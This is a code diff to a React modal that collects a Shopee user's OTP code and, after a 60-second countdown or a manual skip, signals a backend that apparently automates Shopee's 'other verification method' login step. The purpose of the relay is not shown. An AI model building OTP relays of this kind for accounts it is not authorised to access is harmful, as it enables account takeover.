@@ -185,6 +185,7 @@ function ShopeeOTPModal({ isOpen, username, phone, onSubmitOTP, onCancel, submit
   const [otpCode, setOtpCode] = useState("");
   const [otpChannel, setOtpChannel] = useState("sms"); // "sms" | "whatsapp"
   const [timer60, setTimer60] = useState(60);
+  const [whatsappSignalSent, setWhatsappSignalSent] = useState(false);
 
   useEffect(() => {
     if (isOpen) {
@@ -192,10 +193,33 @@ function ShopeeOTPModal({ isOpen, username, phone, onSubmitOTP, onCancel, submit
       setOtpCode("");
       setOtpChannel("sms");
       setTimer60(60);
+      setWhatsappSignalSent(false);
     }
   }, [isOpen]);
 
+  // Fungsi kirim sinyal WhatsApp ke backend (dipanggil saat timer habis atau "Lewati Timer")
+  const sendWhatsappSignalToBackend = async () => {
+    if (whatsappSignalSent) return; // Jangan kirim 2x
+    setWhatsappSignalSent(true);
+    try {
+      const baseUrl = apiBaseUrl || "";
+      await fetch(`${baseUrl}/api/shopee/select-otp-channel`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "X-API-Key": apiKey || ""
+        },
+        body: JSON.stringify({ username, channel: "whatsapp" })
+      });
+      console.log("[OTP] Sinyal WhatsApp dikirim ke backend — browser akan memicu pemicuan metode lainnya sekarang.");
+    } catch (err) {
+      console.error("Gagal mengirim pilihan channel ke backend:", err);
+    }
+  };
+
   // 60-Second Countdown Timer effect when on step 2
+  // Sinyal WhatsApp BARU dikirim ke backend ketika timer habis (bukan saat masuk step 2)
+  // sehingga backend memulai klik "metode verifikasi lainnya" tepat saat Shopee siap
   useEffect(() => {
     let interval = null;
     if (step === 2 && timer60 > 0) {
@@ -203,7 +227,10 @@ function ShopeeOTPModal({ isOpen, username, phone, onSubmitOTP, onCancel, submit
         setTimer60((prev) => prev - 1);
       }, 1000);
     } else if (step === 2 && timer60 === 0) {
-      setStep(3);
+      // Timer habis → kirim sinyal ke backend SEKARANG, lalu lanjut ke step input OTP
+      sendWhatsappSignalToBackend().then(() => {
+        setStep(3);
+      });
     }
     return () => {
       if (interval) clearInterval(interval);
@@ -214,21 +241,11 @@ function ShopeeOTPModal({ isOpen, username, phone, onSubmitOTP, onCancel, submit
 
   const handleProceedToNextStep = async () => {
     if (otpChannel === "whatsapp") {
+      // Reset timer & flag, masuk ke step 2 (countdown)
+      // TIDAK kirim sinyal ke backend dulu — sinyal dikirim setelah timer 60s habis
       setTimer60(60);
-      setStep(2); // Start 60-second countdown timer phase
-      try {
-        const baseUrl = apiBaseUrl || "";
-        await fetch(`${baseUrl}/api/shopee/select-otp-channel`, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-            "X-API-Key": apiKey || ""
-          },
-          body: JSON.stringify({ username, channel: "whatsapp" })
-        });
-      } catch (err) {
-        console.error("Gagal mengirim pilihan channel ke backend:", err);
-      }
+      setWhatsappSignalSent(false);
+      setStep(2);
     } else {
       setStep(3); // Directly go to OTP code input for SMS
     }
@@ -413,7 +430,11 @@ function ShopeeOTPModal({ isOpen, username, phone, onSubmitOTP, onCancel, submit
               </button>
               <button
                 type="button"
-                onClick={() => setStep(3)}
+                onClick={async () => {
+                  // Jika user lewati timer secara manual, tetap kirim sinyal ke backend
+                  await sendWhatsappSignalToBackend();
+                  setStep(3);
+                }}
                 className="py-2 px-4 text-xs font-bold text-emerald-700 dark:text-emerald-300 bg-emerald-50 dark:bg-emerald-950/60 border border-emerald-200 dark:border-emerald-900/60 rounded-xl hover:bg-emerald-100 transition cursor-pointer"
               >
                 Lewati Timer & Input Kode →
